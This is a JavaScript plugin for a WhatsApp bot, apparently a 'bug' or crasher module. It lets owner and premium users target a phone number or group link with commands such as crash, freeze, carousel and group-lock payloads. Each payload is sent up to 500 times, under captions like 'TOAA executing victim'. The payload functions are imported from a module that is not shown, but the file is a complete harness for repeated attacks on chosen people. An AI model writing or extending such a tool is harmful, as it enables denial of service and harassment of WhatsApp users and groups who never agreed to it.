'use strict';
var settings = require('../settings');
var bug = require('../helper/bugcore');
var sh = require('../helper/swanky');

var swanky = sh.swanky;
var PH = sh.PH;
var RULE = sh.RULE;

var DELAY = { 'toaa-crash': 60, 'toaa-ofmcrl': 5000, 'toaa-forno': 3000, 'toaa-iozk': 1000 };
var DEF_ROUNDS = { 'toaa-crash': 200, 'toaa-freeze-x': 30, 'toaa-ofmcrl': 20, 'toaa-forno': 30 };

function chatOf(m) { return m.key.remoteJid; }
function denied(conn, m) {
  return conn.sendMessage(chatOf(m), { text: '℘ ' + swanky('access denied') + ' ℘' }, { quoted: m });
}

var cooldowns = new Map();
var jobs = new Map();

function cooldownLeft(who) {
  var last = cooldowns.get(who) || 0;
  return Math.max(0, (settings.BUG_COOLDOWN || 180000) - (Date.now() - last));
}
function fmtLeft(ms) {
  var s = Math.ceil(ms / 1000);
  var m = Math.floor(s / 60);
  return m > 0 ? m + 'm ' + (s % 60) + 's' : s + 's';
}
function pause(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

function parseTarget(args) {
  var raw = String((args && args[0]) || '').trim();
  if (!raw) return null;
  if (/^here$/i.test(raw)) return 'here';
  if (/chat\.whatsapp\.com\//.test(raw)) return raw;
  var n = raw.replace(/\D/g, '').replace(/^0+/, '');
  if (n.length < 8) return null;
  return n + '@s.whatsapp.net';
}

async function resolveTarget(conn, m, token) {
  if (!token || token === 'here') return { jid: chatOf(m), label: 'this chat' };
  if (token.indexOf('chat.whatsapp.com') !== -1) {
    var code = token.split('/').pop().split('?')[0];
    var info = await conn.groupGetInviteInfo(code);
    return { jid: info.id, label: info.id.split('@')[0] };
  }
  return { jid: token, label: token.split('@')[0] };
}

async function deploy(conn, m, args, ctx, cmd, label, fn) {
  var chat = chatOf(m);
  var say = function (t) { return conn.sendMessage(chat, { text: t }, { quoted: m }); };

  if (jobs.has(ctx.senderNumber)) {
    return say('℘ ' + swanky('already running') + ' ℘\n' + swanky('.toaa-stop') + ' ' + swanky('to kill it'));
  }

  var token = parseTarget(args);
  if (!token) {
    return say('℘ ' + swanky('usage') + ' ℘\n.' + cmd + ' ' + swanky('+234xxxxxxxxxx') + ' ' + swanky('[rounds]'));
  }

  var force = args.indexOf('force') !== -1;
  if (!force) {
    var left = cooldownLeft(ctx.senderNumber);
    if (left > 0) {
      return say('℘ ' + swanky('hold on') + ' ℘ ' + fmtLeft(left) + '\n℘ ' + swanky('wait 3 minutes before sending another') + ' ℘');
    }
  }

  var rounds = parseInt(args[1], 10);
  if (!rounds || rounds < 1) rounds = DEF_ROUNDS[cmd] || settings.BUG_ROUNDS || 100;
  if (rounds > 500) rounds = 500;

  var t;
  try { t = await resolveTarget(conn, m, token); }
  catch (e) { return say('℘ ' + swanky('bad target') + ' ℘'); }

  cooldowns.set(ctx.senderNumber, Date.now());

  var job = { stop: false };
  jobs.set(ctx.senderNumber, job);

  var caption =
    '℘ ' + swanky('TOAA executing victim') + ' ℘\n\n' +
    '+' + t.label + '\n\n' +
    '℘ ' + swanky(label) + ' ℘  x' + rounds + '\n\n' +
    '℘ ' + swanky('wait 3 minutes before sending another') + ' ℘\n\n' +
    'made by ' + swanky('Mr swanky');

  var shown = await bug.sendBugImage(conn, chat, caption);
  if (!shown) await say(caption);

  var step = DELAY[cmd] || settings.BUG_DELAY || 1200;
  var ok = 0;
  var fail = 0;

  try {
    for (var i = 1; i <= rounds; i++) {
      if (job.stop) break;
      try {
        await fn(conn, t.jid);
        ok++;
        console.log('℘ ' + cmd + ' ' + i + '/' + rounds + ' -> +' + t.label + ' ℘');
      } catch (e) {
        fail++;
        console.log('℘ ' + cmd + ' ' + i + '/' + rounds + ' FAILED: ' + e.message + ' ℘');
      }
      if (i < rounds && !job.stop) await pause(step);
    }
  } finally {
    jobs.delete(ctx.senderNumber);
  }

  var tail = job.stop ? 'stopped' : 'complete';
  await say(PH(label + ' ' + tail + ' -- ' + ok + ' ok / ' + fail + ' failed'));
}

function gated(cmd, label, fn) {
  return {
    category: 'bug',
    handler: async function (conn, m, args, ctx) {
      if (!ctx.isOwner && !ctx.isUserPremium) return denied(conn, m);
      return deploy(conn, m, args, ctx, cmd, label, fn);
    }
  };
}

// -- menu -------------------------------------------------------------------
var ITEMS = [
  ['toaa crash', '.toaa-crash'],
  ['f314 crash', '.toaa-f314'],
  ['private invisible', '.toaa-private'],
  ['freeze xcrash', '.toaa-freeze-x'],
  ['fc crash', '.toaa-fc'],
  ['ofm carousel', '.toaa-ofmcrl'],
  ['iozk freeze', '.toaa-iozk'],
  ['forno status', '.toaa-forno'],
  ['doc thumb', '.toaa-doc'],
  ['doc thumb str', '.toaa-docstr']
];

function menuBody() {
  var lines = [PH('toaa bug engine'), '', RULE, ''];
  for (var i = 0; i < ITEMS.length; i++) {
    var n = i + 1 < 10 ? '0' + (i + 1) : String(i + 1);
    lines.push(n + '  ' + swanky(ITEMS[i][0]) + '  ' + ITEMS[i][1]);
  }
  lines.push('');
  lines.push(RULE);
  lines.push('');
  lines.push('℘ ' + swanky('stop job') + ' ℘  .toaa-stop');
  lines.push('');
  lines.push('made by ' + swanky('Mr swanky'));
  return lines.join('\n');
}

async function sendMenu(conn, m) {
  var jid = chatOf(m);

  var buttons = [];
  for (var i = 0; i < ITEMS.length; i++) {
    buttons.push({
      buttonId: ITEMS[i][1],
      buttonText: { displayText: (i + 1) + '. ' + swanky(ITEMS[i][0]) },
      type: 1
    });
  }

  try {
    await conn.sendMessage(jid, {
      image: { url: settings.BUG_IMAGE },
      caption: menuBody(),
      footer: '℘ prefix . ℘ target required',
      buttons: buttons,
      headerType: 4
    }, { quoted: m });
  } catch (e) {
    await conn.sendMessage(jid, { text: menuBody() }, { quoted: m });
  }
}

var TABLE = [
  ['toaa-crash', 'toaa crash', bug.toaaCrash],
  ['toaa-f314', 'f314 crash', bug.f314],
  ['toaa-private', 'private invisible', bug.privatefunc],
  ['toaa-freeze-x', 'freeze xcrash', bug.freezeXcrash],
  ['toaa-fc', 'fc crash', bug.fcCrash],
  ['toaa-ofmcrl', 'ofm carousel', bug.ofmcrl],
  ['toaa-iozk', 'iozk freeze', bug.iozk],
  ['toaa-forno', 'forno status', bug.fornoklos],
  ['toaa-doc', 'doc thumb', bug.docThumb]
];

var commands = {
  bugmenu: {
    category: 'bug',
    handler: async function (conn, m) { await sendMenu(conn, m); }
  },
  bugmenu2: {
    category: 'bug',
    handler: async function (conn, m) { await sendMenu(conn, m); }
  },

  'toaa-docstr': {
    category: 'bug',
    handler: async function (conn, m, args, ctx) {
      if (!ctx.isOwner && !ctx.isUserPremium) return denied(conn, m);
      return deploy(conn, m, args, ctx, 'toaa-docstr', 'doc thumb str', function (c, j) {
        return bug.docThumb(c, j, true);
      });
    }
  },

  'toaa-stop': {
    category: 'bug',
    handler: async function (conn, m, args, ctx) {
      var chat = chatOf(m);
      if (!ctx.isOwner && !ctx.isUserPremium) return denied(conn, m);
      var job = jobs.get(ctx.senderNumber);
      if (!job) {
        return conn.sendMessage(chat, { text: '℘ ' + swanky('nothing running') + ' ℘' }, { quoted: m });
      }
      job.stop = true;
      await conn.sendMessage(chat, { text: '℘ ' + swanky('stopping after this round') + ' ℘' }, { quoted: m });
    }
  },

  diag: {
    category: 'bug',
    handler: async function (conn, m, args, ctx) {
      var chat = chatOf(m);
      if (!ctx.isOwner) return denied(conn, m);

      var token = parseTarget(args);
      if (!token) {
        return conn.sendMessage(chat, { text: '℘ ' + swanky('usage') + ' ℘ .diag ' + swanky('+234xxxxxxxxxx') }, { quoted: m });
      }

      var t;
      try { t = await resolveTarget(conn, m, token); }
      catch (e) { return conn.sendMessage(chat, { text: '℘ ' + swanky('bad target') + ' ℘' }, { quoted: m }); }

      await conn.sendMessage(chat, { text: '℘ ' + swanky('diag running against') + ' ℘ +' + t.label }, { quoted: m });

      var sup = bug.protoSupport();
      var lines = ['℘ diag -> +' + t.label + ' ℘', ''];
      for (var k in sup) lines.push((sup[k] ? '[ ok ]  ' : '[MISS]  ') + k);
      lines.push('');
      lines.push('encode gsmv2: ' + bug.encodeSize().gsmv2 + ' bytes');
      lines.push('');

      var res = await bug.diag(conn, t.jid);
      for (var i = 0; i < res.length; i++) lines.push(res[i]);

      var report = lines.join('\n');
      await conn.sendMessage(chat, { text: report }, { quoted: m });
      console.log(report);
    }
  },

  'toaa-lock': {
    category: 'bug',
    handler: async function (conn, m, args, ctx) {
      var chat = chatOf(m);
      if (!ctx.isOwner) return denied(conn, m);
      var jid = chat;
      var token = parseTarget(args);
      if (token && token !== 'here') {
        try { jid = (await resolveTarget(conn, m, token)).jid; }
        catch (e) { return conn.sendMessage(chat, { text: '℘ ' + swanky('bad target') + ' ℘' }, { quoted: m }); }
      }
      if (!jid.endsWith('@g.us')) {
        return conn.sendMessage(chat, { text: '℘ ' + swanky('group only') + ' ℘' }, { quoted: m });
      }
      await conn.sendMessage(chat, { text: '℘ ' + swanky('locking 75x') + ' ℘ ' + jid.split('@')[0] }, { quoted: m });
      await bug.lockGroup(conn, jid, 75);
      await conn.sendMessage(chat, { text: PH('lock_group complete on ' + jid.split('@')[0]) }, { quoted: m });
    }
  }
};

for (var i = 0; i < TABLE.length; i++) {
  var cmd = TABLE[i][0];
  var label = TABLE[i][1];
  var fn = TABLE[i][2];

  commands[cmd] = gated(cmd, label, (function (f) {
    return function (conn, jid) { return f(conn, jid); };
  })(fn));
}

module.exports = { name: 'bugs', version: '4.0', author: 'swanky', commands: commands };